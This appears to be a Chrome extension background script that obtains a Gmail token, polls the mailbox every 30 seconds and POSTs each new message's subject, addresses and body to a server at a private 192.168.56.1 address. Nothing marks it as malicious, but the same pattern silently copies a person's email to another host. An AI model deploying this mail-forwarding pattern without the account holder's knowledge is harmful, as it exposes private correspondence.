let lastChecked = Date.now();

async function fetchAndForwardEmails(token) {
  const query = `after:${Math.floor(lastChecked / 1000)}`;
  const res = await fetch(`https://www.googleapis.com/gmail/v1/users/me/messages?q=${query}`, {
    headers: {
      Authorization: `Bearer ${token}`
    }
  });
  const data = await res.json();

  if (data.messages) {
    for (const msg of data.messages) {
      const msgRes = await fetch(`https://www.googleapis.com/gmail/v1/users/me/messages/${msg.id}?format=full`, {
        headers: { Authorization: `Bearer ${token}` }
      });
      const msgData = await msgRes.json();
      const payload = {
        subject: msgData.payload.headers.find(h => h.name === "Subject")?.value || "",
        from: msgData.payload.headers.find(h => h.name === "From")?.value || "",
        to: msgData.payload.headers.find(h => h.name === "To")?.value || "",
        body: atob(msgData.payload?.body?.data || ''),
        messageId: msg.id
      };

      // Forward it
      await fetch('https://192.168.56.1:5000/new-mail', {
        method: 'POST',
        body: JSON.stringify(payload),
        headers: { 'Content-Type': 'application/json' }
      });
    }
  }

  lastChecked = Date.now();
}

chrome.identity.getAuthToken({ interactive: true }, (token) => {
  if (token) {
    setInterval(() => fetchAndForwardEmails(token), 30000); // Check every 30s
  }
});
